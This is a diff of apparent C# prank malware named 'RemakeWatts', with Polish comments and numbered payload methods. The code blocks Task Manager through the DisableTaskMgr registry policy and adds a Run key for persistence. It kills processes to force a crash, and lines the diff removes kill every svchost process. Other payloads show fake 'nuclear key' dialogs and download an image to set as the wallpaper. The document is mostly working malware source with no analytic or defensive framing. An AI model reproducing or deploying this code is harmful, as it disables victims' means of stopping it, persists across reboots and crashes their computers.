@@ -1,15 +1,9 @@
-﻿using System;
-using System.IO;
-using System.Collections.Generic;
-using System.Linq;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
-using Microsoft.Win32;
-using System.Threading;
+﻿using Microsoft.Win32;
+using System;
 using System.Diagnostics;
-using System.Media;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace RemakeWatts
 {
@@ -20,7 +14,7 @@ namespace RemakeWatts
         public void BlockTaskMngr()
         {
             RegistryKey blockTaskMgr = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-            if (blockTaskMgr.GetValue("DisableTaskMgr") == null | (int)blockTaskMgr.GetValue("DisableTaskMgr") == 0)
+            if (blockTaskMgr.GetValue("DisableTaskMgr") == null)
             {
                 blockTaskMgr.SetValue("DisableTaskMgr", 1);
                 blockTaskMgr.Close();
@@ -29,11 +23,11 @@ namespace RemakeWatts
         public void AutoStart()
         {
             RegistryKey autoStart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
-            autoStart.SetValue("Papointeligencja", Application.StartupPath + "\\RemakeWatts.exe");
+            autoStart.SetValue("Papointeligencja", '"' + Application.StartupPath + '"' + "\\RemakeWatts.exe");
             autoStart.Close();
         }
 
-        public void InsertNuclearKey()//Kody nuklearne
+        public void InsertNuclearKey() //Kody nuklearne
         {
             DialogResult dialog = MessageBox.Show("Insert Nuclear Key", "Launch nuclear warhead???", MessageBoxButtons.YesNo);
             if (dialog == DialogResult.Yes)
@@ -48,7 +42,7 @@ namespace RemakeWatts
                 {
                     Console.WriteLine(ex.Message);
                 }
-            } 
+            }
             else
             {
                 //Proceskrytyczny_blue_screen
@@ -58,6 +52,13 @@ namespace RemakeWatts
                     proc.Kill();
                 }
             }
+        }
+
+        public static String version()
+        {
+            System.Version version = new System.Version();
+
+            return version.Major.ToString();
         }
         //Obrazek1
         public void payload1()
@@ -78,7 +79,7 @@ namespace RemakeWatts
             });
             thread.SetApartmentState(ApartmentState.STA);
             thread.Start();
-            }
+        }
         //Kody nuklearne
         public void payload3()
         {
@@ -87,16 +88,9 @@ namespace RemakeWatts
         //Pobieranie
         public void payload4()
         {
-            /*
-            new Thread(() =>
-            {
-                SoundPlayer player = new SoundPlayer(Properties.Resources.Paris_Platynov_zalewa_cały_sprzęt_cisowianka_Rage_roku);
-                player.PlayLooping();
-            }).Start();
-            */
             Thread thread = new Thread(() =>
             {
-                Application.Run(new Download());
+                Application.Run(new DownloadCodes());
             });
             thread.SetApartmentState(ApartmentState.STA);
             thread.Start();
@@ -104,37 +98,16 @@ namespace RemakeWatts
         //Turbotacka
         public void payload5()
         {
-            for(int i = 0; i < 10; i++)
+            new Thread(() =>
             {
-                int result = msciSendString("Set cdaudio door open wait", null, 0, 0);
-                Thread.Sleep(300);
-                result = msciSendString("Set cdaudio door closed", null, 0, 0);
-            }
+                MessageBox.Show(Payload.version());
+                Download d = new Download();
+                Wallpaper wallpaper = new Wallpaper();
+                d.download("https://raw.githubusercontent.com/BONK220/Watykanczyk/master/maxresdefault.jpg", Application.StartupPath);
+                Thread.Sleep(3000);
+                wallpaper.SetWallpaper($"{Application.StartupPath}/maxresdefault.jpg");
+            }).Start();
         }
-        //Syfiaste pliki
-        public void payload6()
-        {
-            //@"%userprofile%\Desktop\plik"
-            string path = @"%userprofile%\Desktop\Morawiecki.txt";
-            if (!File.Exists(path))
-            {
-                // Create a file to write to.
-                using (StreamWriter sw = File.CreateText(path))
-                {
-                    sw.WriteLine("Kto umrze to umrze i trudno");
-                    sw.WriteLine("(Morawiecki)");
-                }
-            }
-        }
-        public void payload7()
-        {
-            MessageBox.Show("Morawiecki zaraz zabije ci komputer");
-            Thread.Sleep(128220);
-            Process[] processes = Process.GetProcessesByName("svchost");
-            foreach (var proc in processes)
-            {
-                proc.Kill();
-            }
     }
 
 }
